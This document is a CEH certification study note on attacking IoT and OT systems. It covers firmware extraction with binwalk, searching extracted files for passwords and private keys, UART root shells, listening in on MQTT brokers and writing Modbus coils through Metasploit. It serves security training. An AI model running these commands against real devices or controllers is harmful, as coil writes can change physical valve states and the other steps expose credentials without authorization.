# 02. Attack Techniques — IoT and OT Hacking

> [!WARNING] ⚡ **Exploitation Methodologies & Execution Scenarios**
> Direct extraction from official CEH v13 Syllabus (Module 18). Covers Firmware Extraction & Analysis (Binwalk), Hardware Debugging (UART / JTAG), MQTT Topic Eavesdropping, Modbus Register Tampering, and OT Network Reconnaissance.

---

## ⚔️ 1. Primary IoT & OT Exploitation Workflows

### 1.1 IoT Firmware Extraction & Analysis Workflow

#### Step 1: Dump Firmware Binaries from Flash Memory
Connect hardware programmers (e.g., Bus Pirate, CH341A) to flash chips (SPI Flash / EEPROM) or extract firmware update images.

#### Step 2: Extract Filesystem using Binwalk
```bash
# Analyze firmware binary structure
binwalk firmware.bin

# Extract embedded Linux filesystem (squashfs/jffs2)
binwalk -e --matryoshka firmware.bin
```

#### Step 3: Analyze Extracted Filesystem for Credentials & Secrets
```bash
# Search extracted squashfs-root for hardcoded passwords and private keys
grep -rnw 'squashfs-root/etc/' -e 'password'
find squashfs-root/ -name "*.pem" -o -name "*.key"
```

### 1.2 Hardware Interface Debugging (UART / JTAG)
- **UART (Universal Asynchronous Receiver-Transmitter)**: Identifies `TX`, `RX`, `GND`, and `VCC` pins using a multimeter. Connecting a USB-to-TTL adapter at baud rate `115200` often drops directly into an unauthenticated root Linux shell (`ttyS0`).
- **JTAG (Joint Test Action Group)**: Provides low-level boundary scan and hardware debugging, allowing memory dumps and direct CPU register manipulation.

### 1.3 MQTT Eavesdropping & Modbus Register Override Syntax
```bash
# 1. Subscribe to all MQTT topics on an unauthenticated broker
mosquitto_sub -h 192.168.1.50 -p 1883 -t "#" -v

# 2. Modbus TCP Register Injection (Using Metasploit)
use auxiliary/scanner/scada/modbusclient
set RHOSTS 192.168.1.100
set DATA 1
set ACTION WRITE_COIL
run
```

> [!DANGER] 🛡️ **📋 Comprehensive IoT/OT Attack Execution Matrix**

| Attack Type | Target Component | Tool / Command Syntax | Technical Outcome |
| :--- | :--- | :--- | :--- |
| **Firmware Reversing**| Flash Memory | `binwalk -e firmware.bin` | Discloses root passwords & API keys |
| **UART Shell Drop** | Serial Hardware Pins | `picocom -b 115200 /dev/ttyUSB0` | Yields unauthenticated root Linux shell |
| **MQTT Interception**| MQTT Broker | `mosquitto_sub -h host -t "#"` | Intercepts all sensor telemetry |
| **Modbus Tampering** | PLC / Controller | `nmap --script modbus-discover` | Modifies physical coil/valve states |
